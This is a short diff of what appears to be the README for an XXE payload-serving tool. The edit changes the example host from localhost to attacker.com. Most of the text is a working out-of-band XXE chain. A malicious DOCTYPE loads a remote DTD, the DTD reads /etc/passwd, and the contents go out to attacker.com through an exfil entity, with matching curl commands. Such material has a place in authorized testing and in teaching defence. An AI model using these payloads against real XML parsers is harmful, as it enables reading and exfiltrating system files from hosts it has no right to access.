@@ -22,14 +22,14 @@ $ curl 'http://attacker.com:32032/payload?entity=file:///etc/passwd'
 <?xml version="1.0" ?>
 <!DOCTYPE r [
    <!ELEMENT r ANY >
-   <!ENTITY % sp SYSTEM "http://localhost:32032/dtd?entity=file:///etc/passwd">
+   <!ENTITY % sp SYSTEM "http://attacker.com:32032/dtd?entity=file:///etc/passwd">
    %sp;
    %param1;
    %exfil;
 ]>
-$ curl 'http://localhost:32032/dtd?entity=file:///etc/passwd'
+$ curl 'http://attacker.com:32032/dtd?entity=file:///etc/passwd'
 <!ENTITY % data SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://localhost:32032/exfil/query?data=%data;'>">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com:32032/exfil/query?data=%data;'>">
 ```
 
 ## Features
